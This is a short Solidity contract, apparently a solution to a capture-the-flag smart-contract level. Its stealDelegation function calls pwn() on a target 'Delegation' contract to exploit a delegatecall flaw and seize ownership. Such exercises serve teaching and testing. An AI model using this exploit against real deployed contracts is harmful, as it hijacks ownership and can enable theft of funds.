// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Delegation} from "./Delegate.sol";

contract StealDelegation {
    address public owner;
    address public delegation;

    constructor(address _owner, address _delegation) {
        owner = _owner;
        delegation = _delegation;
    }

    function stealDelegation() public returns(bool) {
        (bool success, ) = delegation.call(abi.encodeWithSignature("pwn()"));
        return success;
    }
}